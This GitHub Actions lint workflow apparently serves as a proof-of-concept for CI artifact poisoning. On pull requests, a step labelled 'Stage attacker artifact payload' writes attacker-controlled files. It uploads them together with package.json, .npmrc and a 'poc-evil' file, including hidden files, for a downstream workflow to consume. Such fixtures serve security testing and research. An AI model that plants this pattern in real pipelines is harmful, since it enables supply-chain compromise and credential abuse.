---
name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage attacker artifact payload
        run: |
          echo "${{ github.event.pull_request.number }}" > pr-number.txt
          printf 'attacker controlled linter output' > linter-report.txt

      - name: Upload linter report
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            pr-number.txt
            linter-report.txt
            package.json
            .npmrc
            poc-evil
          include-hidden-files: true
          if-no-files-found: ignore
